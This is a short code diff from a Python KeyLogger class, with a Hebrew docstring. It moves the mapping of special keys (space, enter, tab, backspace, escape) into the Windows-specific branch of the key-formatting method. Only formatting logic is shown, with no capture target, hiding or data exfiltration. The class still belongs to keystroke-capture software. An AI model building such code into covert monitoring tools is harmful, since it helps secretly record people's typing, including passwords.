@@ -85,6 +85,15 @@ class KeyLogger:
     def _format_key(self, key):
         """תרגום המקש לתו לפי השפה הנוכחית"""
         if self.platform_system == "Windows":
+            special_keys = {
+                keyboard.Key.space: ' ',
+                keyboard.Key.enter: '[ENTER]\n',
+                keyboard.Key.tab: '[TAB]',
+                keyboard.Key.backspace: '[BACKSPACE]',
+                keyboard.Key.esc: '[ESC]'
+            }
+            if key in special_keys:
+                return special_keys[key]
             vk = scancode = None
             if isinstance(key, keyboard.KeyCode):
                 vk = key.vk
@@ -102,15 +111,7 @@ class KeyLogger:
                 return buff.value[:ret]
             return f"[{key.name}]"
 
-        special_keys = {
-            keyboard.Key.space: ' ',
-            keyboard.Key.enter: '[ENTER]\n',
-            keyboard.Key.tab: '[TAB]',
-            keyboard.Key.backspace: '[BACKSPACE]',
-            keyboard.Key.esc: '[ESC]'
-        }
-        if key in special_keys:
-            return special_keys[key]
+
 
         if isinstance(key, keyboard.KeyCode):
             return key.char if key.char else f"[{key.vk}]"
